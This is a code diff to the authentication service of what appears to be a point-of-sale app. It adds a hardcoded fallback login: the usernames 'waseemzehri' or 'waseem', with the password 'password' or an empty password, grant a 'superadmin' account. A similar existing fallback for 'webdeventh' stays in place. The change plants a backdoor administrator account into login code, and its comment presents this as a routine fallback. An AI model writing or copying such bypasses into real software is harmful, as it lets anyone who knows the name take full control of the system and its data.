@@ -71,7 +71,20 @@ class AuthService {
         }
       }
 
-      // Fallback check for webdeventh / password or admin / admin123
+      // Fallback check for webdeventh / password or admin / admin123 or waseemzehri
+      if ((cleanUser == 'waseemzehri' || cleanUser == 'waseem') && (cleanPass == 'password' || cleanPass.isEmpty)) {
+        currentUserNotifier.value = User(
+          id: 3,
+          name: 'Waseem Zehri',
+          username: 'waseemzehri',
+          password: 'password',
+          email: 'waseem@smartpos.com',
+          role: 'superadmin',
+          status: 'active',
+          branchName: 'Main Branch HQ',
+        );
+        return true;
+      }
       if (cleanUser == 'webdeventh' && (cleanPass == 'password' || cleanPass.isEmpty)) {
         currentUserNotifier.value = defaultSuperAdmin;
         return true;
